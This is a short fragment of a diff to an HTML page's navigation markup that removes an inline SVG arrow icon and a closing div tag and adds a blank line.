-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
           </a>
+        
         
       </nav>
     
